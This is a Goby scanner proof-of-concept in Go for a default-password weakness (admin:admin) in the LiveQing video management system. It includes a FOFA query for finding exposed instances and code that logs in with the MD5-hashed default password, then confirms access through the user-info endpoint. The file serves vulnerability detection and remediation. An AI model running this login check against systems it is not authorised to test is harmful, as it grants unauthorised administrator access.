package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Liveqing login default password vulnerability",
    "Description": "<p>Qingshi Video Management System is a user management and Web visual page video management platform provided by Qingshi Information Technology. It supports local, intranet, and private cloud deployment; supports Windows and Linux without installation, decompression and one-click startup; supports distributed deployment; complete secondary development Interface documentation; WEB visual management background.</p><p>There is a default password vulnerability in the system. Users can use admin:admin to log in as an administrator to enter the backend to view logs, manage users, and change basic configurations.</p>",
    "Product": "LiveQing GBS",
    "Homepage": "https://www.liveqing.com/",
    "DisclosureDate": "2023-11-24",
    "PostTime": "2023-11-24",
    "Author": "Gryffinbit@gmail.com",
    "FofaQuery": "body=\"js/liveplayer-lib.min.js\" && body=\"css/index\"",
    "GobyQuery": "body=\"js/liveplayer-lib.min.js\" && body=\"css/index\"",
    "Level": "2",
    "Impact": "<p>The system has a default password vulnerability. Users can use admin:admin to log in as an administrator to enter the backend to view logs, manage users, and change basic configurations.</p>",
    "Recommendation": "<p>1. Change the default password. The password must contain uppercase and lowercase letters, digits, and special characters, and must contain more than 8 digits.</p><p>2. Disable the public network from accessing the system if necessary.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": false,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.8",
    "Translation": {
        "CN": {
            "Name": "青柿视频流媒体 login 默认口令漏洞",
            "Product": "青柿视频管理系统",
            "Description": "<p>青柿视频管理系统是青柿信息科技提供用户管理及Web可视化页面视频管理平台，支持本地、内网、私有云部署；支持Windows，Linux免安装，解压一键启动；支持分布式部署；完整二次开发接口文档；WEB可视管理后台。<br></p><p>该系统存在默认口令漏洞，用户通过 admin:admin 管理员身份登陆进入后台，进行日志查看、用户管理、更改基础配置等操作。</p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>该系统存在默认口令漏洞，用户通过 admin:admin，则可用管理员身份登陆进入后台，进行日志查看、用户管理、更改基础配置等操作。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "Liveqing login default password vulnerability",
            "Product": "LiveQing GBS",
            "Description": "<p>Qingshi Video Management System is a user management and Web visual page video management platform provided by Qingshi Information Technology. It supports local, intranet, and private cloud deployment; supports Windows and Linux without installation, decompression and one-click startup; supports distributed deployment; complete secondary development Interface documentation; WEB visual management background.</p><p>There is a default password vulnerability in the system. Users can use admin:admin to log in as an administrator to enter the backend to view logs, manage users, and change basic configurations.</p>",
            "Recommendation": "<p>1. Change the default password. The password must contain uppercase and lowercase letters, digits, and special characters, and must contain more than 8 digits.</p><p>2. Disable the public network from accessing the system if necessary.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>The system has a default password vulnerability. Users can use admin:admin to log in as an administrator to enter the backend to view logs, manage users, and change basic configurations.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10878"
}`

	loginPayloadYdyfFRGF83d := func(hostInfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		loginConfig := httpclient.NewGetRequestConfig("/api/v1/login?username=admin&password=21232f297a57a5a743894a0e4a801fc3")
		loginConfig.VerifyTls = false
		loginConfig.FollowRedirect = false
		loginConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
		return httpclient.DoHttpRequest(hostInfo, loginConfig)
	}
	loginPayloadYPostdyfFRGF83d := func(hostInfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		loginConfig := httpclient.NewPostRequestConfig("/api/v1/login")
		loginConfig.VerifyTls = false
		loginConfig.FollowRedirect = false
		loginConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
		loginConfig.Data = "username=admin&password=21232f297a57a5a743894a0e4a801fc3"
		return httpclient.DoHttpRequest(hostInfo, loginConfig)
	}
	checkLoginYdyfFRGF83d := func(hostInfo *httpclient.FixUrl, uri, token string) (*httpclient.HttpResponse, error) {
		checkConfig := httpclient.NewGetRequestConfig(uri)
		checkConfig.VerifyTls = false
		checkConfig.FollowRedirect = false
		checkConfig.Header.Store("Cookie", token)
		return httpclient.DoHttpRequest(hostInfo, checkConfig)
	}
	checkLoginPostYdyfFRGF83d := func(hostInfo *httpclient.FixUrl, uri, token string) (*httpclient.HttpResponse, error) {
		checkConfig := httpclient.NewPostRequestConfig(uri)
		checkConfig.VerifyTls = false
		checkConfig.FollowRedirect = false
		checkConfig.Header.Store("Cookie", token)
		return httpclient.DoHttpRequest(hostInfo, checkConfig)
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(poc *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			// strings.contains 限制的关键词勿改，经测试，不同的站返回值并非全部相同
			resp, _ := loginPayloadYdyfFRGF83d(hostInfo)
			if resp != nil && resp.StatusCode == 200 && ((strings.Contains(resp.Utf8Html, "\"Token\"")) || !strings.Contains(resp.Utf8Html, "用户名或密码错误")) {
				parts := strings.Split(resp.Header.Get("Set-Cookie"), ";")
				check, _ := checkLoginYdyfFRGF83d(hostInfo, "/api/v1/userinfo", parts[0])
				if check != nil && check.StatusCode == 200 && strings.Contains(check.Utf8Html, "admin") {
					stepLogs.VulURL = fmt.Sprintf("%s://admin:admin@%s", hostInfo.Scheme(), hostInfo.HostInfo)
					return true
				}
			}
			// 有一部分魔改站，需要用POST 的方式才能获取到 Cookie 并成功登陆访问
			respPost, _ := loginPayloadYPostdyfFRGF83d(hostInfo)
			if respPost != nil && respPost.StatusCode == 200 && ((strings.Contains(respPost.Utf8Html, "\"Token\"")) || !strings.Contains(respPost.Utf8Html, "用户名或密码错误")) {
				partsPost := strings.Split(respPost.Header.Get("Set-Cookie"), ";")
				checkPost, _ := checkLoginPostYdyfFRGF83d(hostInfo, "/api/v1/userInfo", partsPost[0])
				if checkPost != nil && checkPost.StatusCode == 200 && strings.Contains(checkPost.Utf8Html, "admin") {
					stepLogs.VulURL = fmt.Sprintf("%s://admin:admin@%s", hostInfo.Scheme(), hostInfo.HostInfo)
					return true
				}
			}
			return false
		},
		nil,
	))
}
